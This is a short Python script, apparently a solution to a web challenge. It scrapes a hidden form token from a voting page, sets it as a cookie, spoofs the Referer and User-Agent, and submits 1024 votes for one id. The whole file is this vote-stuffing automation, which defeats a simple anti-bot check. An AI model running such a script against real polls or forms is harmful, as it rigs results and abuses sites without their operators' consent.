import requests
from bs4 import BeautifulSoup

# set up our payload and url 
payload = {'id': 244, 'holdthedoor': 'Submit'}
headers = {'Referer': 'http://158.69.76.135/level2.php',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0',
           'Host': '158.69.76.135',
           'Connection': 'keep-alive'
}
url = "http://158.69.76.135/level2.php"

for i in range(1024):
    # get the sites HTML
    site = requests.get(url)
    # scrape the site for its key
    soup = BeautifulSoup(site.text, 'html.parser')
    secret = soup.find('input', attrs={'name':'key'})['value']

    # create and append our header
    headers.update({'Cookie': 'HoldTheDoor={}'.format(secret)})
    payload.update({'key': secret})
    r = requests.post(url, data=payload, headers=headers)
# print(r.text)
